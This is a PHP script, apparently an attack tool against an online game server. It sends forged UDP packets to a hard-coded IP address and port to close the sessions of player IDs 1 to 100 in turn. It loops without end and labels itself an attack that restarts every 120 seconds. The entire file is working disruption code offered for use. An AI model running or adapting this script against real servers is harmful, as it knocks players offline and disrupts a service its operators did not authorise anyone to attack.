<?php 
// SILENCIOSO

// [CONFIG]
$id_start = 1;
$id_end = 100;

require("_public/class/utils.php");
require("_public/class/int_byte.php");

$write = new SendPacket();
$write->addr = "144.217.61.149";
$write->port = 1909;

$socket = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
while (true) {

	for ($pId=$id_start; $pId <= $id_end; $pId++) { 

		$write->int16(10);  // opcode
		$write->int64($pId); // playerId

		$write->Send();
		$write->clear();

		echo "[".round(number_format($pId,$id_end),2)."%]\tPlayerId $pId Close - $pId/$id_end\n";
		usleep(200000);
	}

	echo "[RECOMEÇANDO ATAQUE EM 120 SEGUNDOS]";
	sleep(120);
}